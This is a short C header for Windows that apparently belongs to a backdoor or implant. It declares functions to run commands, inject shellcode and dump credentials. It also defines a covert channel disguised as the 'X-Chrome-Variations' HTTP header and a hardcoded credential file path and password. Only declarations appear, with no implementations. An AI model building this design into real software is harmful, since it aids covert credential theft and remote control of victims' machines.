#pragma once
#include "pch.h"
#include <Windows.h>

#define MAX_DATA 40000
#define BUFSIZE 4096

// Communication Header for the Response.
#define COM_HEADER "X-Chrome-Variations"
#define PASS_FILE "C:\\Windows\\Temp\\creds.db"
#define PASSWORD "SIMPLEPASS"



// Function definitions
BOOL RunCommand(OUT LPVOID lpData, IN LPSTR Command);
VOID InjectShellcode(OUT LPVOID lpData, IN LPVOID lpShellcode);
VOID WriteBody(IN LPVOID lpInputData);
VOID DumpCreds(OUT LPVOID lpOutData);